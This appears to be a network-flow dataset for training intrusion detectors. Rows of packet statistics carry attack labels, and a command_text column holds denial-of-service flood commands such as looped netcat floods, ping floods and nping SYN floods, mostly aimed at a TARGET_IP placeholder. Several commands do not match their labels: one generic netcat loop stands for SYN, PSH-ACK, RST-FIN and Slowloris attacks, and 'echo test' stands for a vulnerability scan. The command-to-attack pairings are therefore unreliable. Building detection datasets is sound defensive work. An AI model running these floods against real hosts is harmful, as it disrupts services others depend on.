Header_Length,Protocol Type,Time_To_Live,Rate,fin_flag_number,syn_flag_number,rst_flag_number,psh_flag_number,ack_flag_number,ece_flag_number,cwr_flag_number,ack_count,syn_count,fin_count,rst_count,HTTP,HTTPS,DNS,Telnet,SMTP,SSH,IRC,TCP,UDP,DHCP,ARP,ICMP,IGMP,IPv,LLC,Tot sum,Min,Max,AVG,Std,Tot size,IAT,Number,Variance,Label,command_text
20.0,6,64.0,36494.42269,0.0,0.0,0.0,1.0,1.0,0.0,0,100,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.74e-05,100,0.0,DDOS-PSHACK_FLOOD,"while true; do echo ""A"" | nc 10.0.0.2 8080 -w1 -p 12345; done"
20.0,6,64.0,32681.19059,0.0,1.0,0.0,0.0,0.0,0.0,0,0,100,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,3.06e-05,100,0.0,DDOS-SYNONYMOUSIP_FLOOD,"nping --syn --data-string ""payload"" --rate 10000 10.0.0.4"
0.08,1,64.64,20982.01101,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.01,0,0,0,0,0.0,0.01,0.0,0.0,0.99,0,1.0,1.0,6022,60,82,60.22,2.2,60.22,4.77e-05,100,4.84,DDOS-ICMP_FLOOD,sudo ping -s 65507 -f -c 10000 10.0.0.3
8.0,17,64.0,44582.31293,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.24e-05,100,0.0,DDOS-UDP_FLOOD,python3 flood.py -t 10.0.0.2 -p 53 --rate 10000
20.0,6,64.0,30929.16452,0.0,1.0,0.0,0.0,0.0,0.0,0,0,100,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,3.23e-05,100,0.0,DDOS-SYN_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,16680.46928,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,6e-05,100,0.0,DOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
8.0,17,64.0,13080.62997,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,7.64e-05,100,0.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
0.0,1,64.0,23657.87128,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.0,0.0,0.0,1.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,4.23e-05,100,0.0,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
20.0,6,64.0,34247.60349,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,1.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.92e-05,100,0.0,DDOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
8.0,17,64.0,24912.71086,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,4.01e-05,100,0.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
18.4,6,49.8,318.044253,0.0,0.0,0.0,0.3,0.5,0.0,0,5,0,0,0,0.0,0.0,0.0,0,0,0,0,0.5,0.3,0.0,0.2,0.0,0,0.8,0.8,1593,60,680,159.3,197.8023986,159.3,0.003435301781,10,39125.78889,VULNERABILITYSCAN,echo test > /dev/null
8.72,17,64.0,8750.529917,0.0,0.0,0.0,0.01,0.03,0.0,0,3,0,0,0,0.0,0.0,0.0,0,0,0,0,0.03,0.97,0.0,0.0,0.0,0,1.0,1.0,6169,60,217,61.69,15.71057355,61.69,0.000115,100,246.8221212,DOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
20.76,6,64.0,20112.70739,0.0,0.19,0.81,0.0,0.19,0.0,0,19,19,0,81,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,4.97e-05,100,0.0,DOS-SYN_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,39824.38283,0.0,0.0,0.0,1.0,1.0,0.0,0,100,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.51e-05,100,0.0,DDOS-PSHACK_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,19650.05388,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,5.09e-05,100,0.0,DDOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,47127.01124,0.0,0.0,0.0,1.0,1.0,0.0,0,100,0,0,0,0.0,1.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.12e-05,100,0.0,DDOS-PSHACK_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,44587.0522,0.0,1.0,0.0,0.0,0.0,0.0,0,0,100,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.24e-05,100,0.0,DDOS-SYNONYMOUSIP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.12,6,64.59,27623.1823,0.99,0.0,0.99,0.01,0.01,0.0,0,1,0,99,99,0.0,0.01,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6079,60,139,60.79,7.9,60.79,3.62e-05,100,62.41,DDOS-RSTFINFLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
0.0,1,64.0,8996.791077,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.0,0.0,0.0,1.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,0.000111,100,0.0,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
20.0,6,64.0,44945.3922,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.22e-05,100,0.0,DDOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
0.32,1,64.0,35523.87567,0.0,0.0,0.0,0.01,0.01,0.0,0,1,0,0,0,0.0,0.01,0.0,0,0,0,0,0.01,0.0,0.0,0.0,0.99,0,1.0,1.0,6203,60,263,62.03,20.3,62.03,2.82e-05,100,412.09,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
20.0,6,62.0,102.5599996,0.0,0.0,0.0,0.2,0.5,0.0,0,5,0,0,0,0.0,0.5,0.0,0,0,0,0,0.5,0.5,0.0,0.0,0.0,0,1.0,1.0,4425,60,1514,442.5,617.8272412,442.5,0.009937691689,10,381710.5,BENIGN,echo test > /dev/null
20.0,6,64.0,17786.79445,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,5.62e-05,100,0.0,DDOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
32.0,6,80.7,158.0579202,0.0,0.0,0.0,0.2,1.0,0.0,0,10,0,0,0,0.0,0.9,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,7027,66,1514,702.7,713.074104,702.7,0.006393098831,10,508474.6778,BENIGN,echo test > /dev/null
20.0,6,64.0,20841.26211,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,4.8e-05,100,0.0,DOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
2.56,1,64.75,6642.758271,0.0,0.06,0.0,0.0,0.06,0.06,0,6,6,0,0,0.0,0.06,0.02,0,0,0,0,0.06,0.02,0.0,0.0,0.92,0,1.0,1.0,6440,60,259,64.4,25.32416102,64.4,0.000151,100,641.3131313,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
20.0,6,64.0,30673.57028,0.0,1.0,0.0,0.0,0.0,0.0,0,0,100,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,3.26e-05,100,0.0,DDOS-SYN_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
0.0,1,64.0,186247.9574,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.0,0.0,0.0,1.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.22e-05,100,0.0,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
20.0,6,64.0,5423.902754,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,1.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,0.000185,100,0.0,DOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,44582.31293,0.0,1.0,0.0,0.0,0.0,0.0,0,0,100,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.24e-05,100,0.0,DDOS-SYN_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
19.8,6,63.36,17777.74764,0.0,0.0,0.02,0.97,0.97,0.0,0,97,0,0,2,0.0,0.0,0.0,0,0,0,0,0.99,0.0,0.0,0.01,0.0,0,0.99,0.99,6000,60,60,60.0,0.0,60.0,5.63e-05,100,0.0,DDOS-PSHACK_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
8.0,17,64.0,30646.67543,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,3.26e-05,100,0.0,DOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
18.8,6,74.8,112.828663,0.1,0.0,0.0,0.3,0.9,0.0,0,9,0,1,0,0.6,0.0,0.0,0,0,0,0,0.9,0.1,0.0,0.0,0.0,0,1.0,1.0,3566,54,1500,356.6,538.3557684,356.6,0.01127870083,10,289826.9333,DNS_SPOOFING,dig @TARGET_IP example.com +short
8.52,17,67.71,32177.24588,0.0,0.0,0.0,0.03,0.04,0.0,0,4,0,0,0,0.0,0.01,0.0,0,0,0,0,0.04,0.95,0.0,0.0,0.01,0,1.0,1.0,7387,60,1239,73.87,118.3513563,73.87,0.000113,100,14007.04354,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
0.0,1,64.0,37147.32088,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.0,0.0,0.0,1.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.72e-05,100,0.0,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
20.0,6,64.0,41254.09659,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.42e-05,100,0.0,DDOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
0.0,1,64.0,14624.49093,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.0,0.0,0.0,1.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,6.84e-05,100,0.0,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
8.48,17,67.48,13620.52348,0.0,0.0,0.0,0.01,0.02,0.0,0,2,0,0,0,0.0,0.02,0.0,0,0,0,0,0.02,0.98,0.0,0.0,0.0,0,1.0,1.0,16059,66,162,160.59,10.56112081,160.59,7.34e-05,100,111.5372727,DOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
19.8,6,63.36,28826.83162,0.0,0.99,0.0,0.0,0.0,0.0,0,0,99,0,0,0.0,0.0,0.0,0,0,0,0,0.99,0.0,0.0,0.01,0.0,0,0.99,0.99,6000,60,60,60.0,0.0,60.0,3.47e-05,100,0.0,DDOS-SYN_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,49778.11536,1.0,0.0,1.0,0.0,0.0,0.0,0,0,0,100,100,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.01e-05,100,0.0,DDOS-RSTFINFLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
0.0,1,64.0,41577.16098,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.0,0.0,0.0,1.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.41e-05,100,0.0,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
19.8,6,63.36,14714.27469,0.0,0.99,0.0,0.0,0.0,0.0,0,0,99,0,0,0.0,0.0,0.0,0,0,0,0,0.99,0.0,0.0,0.01,0.0,0,0.99,0.99,6000,60,60,60.0,0.0,60.0,6.8e-05,100,0.0,DDOS-SYNONYMOUSIP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,65.91,19836.85206,0.0,0.0,0.0,0.02,0.02,0.0,0,2,0,0,0,0.0,0.99,0.0,0,0,0,0,0.99,0.01,0.0,0.0,0.0,0,1.0,1.0,6123,60,156,61.23,9.946173316,61.23,5.04e-05,100,98.92636364,DOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,28984.20289,0.0,1.0,0.0,0.0,0.0,0.0,0,0,100,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,3.45e-05,100,0.0,DDOS-SYNONYMOUSIP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
7.92,17,63.36,80258.40031,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.99,0.0,0.01,0.0,0,0.99,0.99,6000,60,60,60.0,0.0,60.0,1.25e-05,100,0.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
19.76,6,63.37,9268.770441,0.0,0.98,0.0,0.0,0.0,0.0,0,0,98,0,0,0.0,0.0,0.0,0,0,0,0,0.98,0.02,0.0,0.0,0.0,0,1.0,1.0,7416,60,768,74.16,99.61934825,74.16,0.000108,100,9924.014545,DDOS-SYN_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,21644.66921,1.0,0.0,1.0,0.0,0.0,0.0,0,0,0,100,100,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,4.62e-05,100,0.0,DDOS-RSTFINFLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
19.76,6,65.28,42443.87776,0.0,0.98,0.0,0.0,0.0,0.0,0,0,98,0,0,0.0,0.0,0.02,0,0,0,0,0.98,0.02,0.0,0.0,0.0,0,1.0,1.0,6165,60,147,61.65,11.62579421,61.65,2.37e-05,100,135.1590909,DDOS-SYNONYMOUSIP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
0.0,1,63.36,22893.42285,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.0,0.0,0.01,0.99,0,0.99,0.99,6000,60,60,60.0,0.0,60.0,4.43e-05,100,0.0,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
28.84,6,74.46,1011.706872,0.08,0.13,0.19,0.32,0.68,0.0,0,68,13,8,19,0.0,0.92,0.0,0,0,0,0,0.92,0.08,0.0,0.0,0.0,0,1.0,1.0,14318,60,2962,143.18,329.5454899,143.18,0.000988,100,108600.2299,DDOS-SLOWLORIS,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,30922.3238,1.0,0.0,1.0,0.0,0.0,0.0,0,0,0,100,100,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,3.24e-05,100,0.0,DDOS-RSTFINFLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,15769.8387,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,6.34e-05,100,0.0,DDOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
8.0,17,64.0,43401.3245,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.31e-05,100,0.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
8.48,17,63.71,24808.09132,0.01,0.0,0.0,0.01,0.02,0.0,0,2,0,1,0,0.02,0.0,0.0,0,0,0,0,0.02,0.98,0.0,0.0,0.0,0,1.0,1.0,6387,60,441,63.87,38.09866378,63.87,4.03e-05,100,1451.508182,DOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
8.0,17,64.0,42956.82098,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.01,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6010,60,70,60.1,1.0,60.1,2.68e-05,100,1.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
8.0,17,64.0,51444.91598,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,1.94e-05,100,0.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
8.0,17,64.0,8058.066127,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,0.000124,100,0.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
0.4,1,70.9,3188.978521,0.0,0.01,0.0,0.0,0.0,0.0,0,0,1,0,0,0.0,0.01,0.0,0,0,0,0,0.01,0.02,0.01,0.02,0.95,0,0.98,0.98,6508,60,350,65.08,32.50040559,65.08,0.000314,100,1056.276364,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
20.0,6,64.0,36311.17652,1.0,0.0,1.0,0.0,0.0,0.0,0,0,0,100,100,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.77e-05,100,0.0,DDOS-RSTFINFLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
8.0,17,64.0,31605.03353,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,3.17e-05,100,0.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
19.84,6,66.95,5777.676148,0.0,0.01,0.02,0.96,0.99,0.0,0,99,1,0,2,0.0,0.0,0.0,0,0,0,0,0.99,0.0,0.0,0.01,0.0,0,0.99,0.99,6000,60,60,60.0,0.0,60.0,0.000176,100,0.0,DDOS-PSHACK_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,44346.62719,0.0,0.0,0.0,1.0,1.0,0.0,0,100,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.26e-05,100,0.0,DDOS-PSHACK_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
0.0,1,64.0,56367.47749,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,0.0,0.0,0.0,1.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,1.8e-05,100,0.0,DDOS-ICMP_FLOOD,ping -f -s 65000 -c 10000 TARGET_IP
8.0,17,64.0,48427.47951,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,0.0,1.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.07e-05,100,0.0,DDOS-UDP_FLOOD,ncat --udp TARGET_IP PORT < /dev/zero
20.0,6,64.0,24545.31835,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,1.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,4.08e-05,100,0.0,DDOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
19.8,6,63.36,7124.083227,0.0,0.0,0.0,0.99,0.99,0.0,0,99,0,0,0,0.0,0.0,0.0,0,0,0,0,0.99,0.0,0.0,0.01,0.0,0,0.99,0.99,6000,60,60,60.0,0.0,60.0,0.00014,100,0.0,DDOS-PSHACK_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
20.0,6,64.0,40681.90107,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,0.0,0.0,0.0,0,0,0,0,1.0,0.0,0.0,0.0,0.0,0,1.0,1.0,6000,60,60,60.0,0.0,60.0,2.51e-05,100,0.0,DDOS-TCP_FLOOD,while true; do nc TARGET_IP PORT < /dev/zero; done
